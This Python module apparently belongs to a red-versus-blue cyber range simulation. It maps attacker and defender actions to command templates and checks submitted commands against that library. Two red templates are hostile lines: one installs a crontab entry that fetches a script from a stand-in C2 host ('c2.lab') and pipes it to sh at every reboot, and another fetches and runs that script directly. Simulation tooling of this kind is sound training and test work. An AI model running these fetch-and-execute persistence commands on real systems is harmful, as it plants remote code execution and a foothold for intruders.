from __future__ import annotations

import re
from typing import Iterable


RED_GENERIC_COMMANDS = {
    "Recon": "nmap -sV -Pn --script=vuln {target}",
    "ExploitService": "lab-exploit --phase initial-access --target {target} --vuln {vuln_id}",
    "LateralMove": "proxychains lab-lateral --target {target} --vuln {vuln_id}",
    "ExfiltrateDatabase": "lab-exfil --target {target} --vuln {vuln_id}",
    "AnchorFoothold": "echo \"@reboot /usr/bin/curl -fsS http://c2.lab/beacon.sh | sh\" | crontab -",
    "ReactivateFoothold": "bash -lc '/usr/bin/curl -fsS http://c2.lab/beacon.sh | sh'",
}

BLUE_GENERIC_RULES = {
    "PatchNode": "ansible {target} -m include_role -a \"name=patch_vulnerability vuln_id={vuln_id}\"",
    "PreventivePatch": "ansible {target} -m package -a \"name='*security*' state=latest\"",
    "RestoreNode": "ansible {target} -m shell -a \"/opt/ir/restore_snapshot.sh --latest --service-recover\"",
    "DeepRestore": "ansible {target} -m shell -a \"/opt/ir/deep_restore.sh --rebuild --credential-reset\"",
    "Isolate": "ansible {target} -m shell -a \"iptables -I INPUT 1 -j DROP && iptables -I OUTPUT 1 -j DROP\"",
    "Monitor": "sigma rule: selection.target='{target}' and event.category in ('network','process') and level>=medium",
    "VulnerabilityScan": "nuclei -silent -severity medium,high,critical -target {target}",
}


def _render(template: str, *, target: str | None, vuln_id: str | None) -> str:
    return (
        template.replace("{target}", target or "network")
        .replace("{vuln_id}", vuln_id or "auto")
    )


def _normalize(value: str) -> str:
    return re.sub(r"\s+", " ", value.strip()).lower()


def build_red_raw_command(*, action_type: str, target: str | None, vuln_id: str | None) -> str:
    template = RED_GENERIC_COMMANDS.get(action_type, "echo \"unsupported red action\"")
    return _render(template, target=target, vuln_id=vuln_id)


def build_blue_defense_rule(*, action_type: str, target: str | None, vuln_id: str | None) -> str:
    template = BLUE_GENERIC_RULES.get(action_type, "echo \"unsupported blue action\"")
    return _render(template, target=target, vuln_id=vuln_id)


def expected_red_raw_commands(*, action_type: str, target: str | None, vuln_id: str | None) -> set[str]:
    return {
        build_red_raw_command(action_type=action_type, target=target, vuln_id=vuln_id),
        build_red_raw_command(action_type=action_type, target=target, vuln_id=None),
    }


def expected_blue_defense_rules(*, action_type: str, target: str | None, vuln_id: str | None) -> set[str]:
    return {
        build_blue_defense_rule(action_type=action_type, target=target, vuln_id=vuln_id),
        build_blue_defense_rule(action_type=action_type, target=target, vuln_id=None),
    }


def is_red_command_from_library(*, action_type: str, target: str | None, vuln_id: str | None, raw_command: str) -> bool:
    return _normalize(raw_command) in {
        _normalize(row)
        for row in expected_red_raw_commands(action_type=action_type, target=target, vuln_id=vuln_id)
    }


def is_blue_rule_from_library(*, action_type: str, target: str | None, vuln_id: str | None, defense_rule: str) -> bool:
    return _normalize(defense_rule) in {
        _normalize(row)
        for row in expected_blue_defense_rules(action_type=action_type, target=target, vuln_id=vuln_id)
    }


def command_library_slice(vuln_ids: Iterable[str]) -> dict[str, dict[str, str]]:
    return {
        vuln_id: {
            "attack_command": build_red_raw_command(
                action_type="ExploitService",
                target="{target}",
                vuln_id=vuln_id,
            ),
            "defense_rule": build_blue_defense_rule(
                action_type="PatchNode",
                target="{target}",
                vuln_id=vuln_id,
            ),
        }
        for vuln_id in vuln_ids
    }
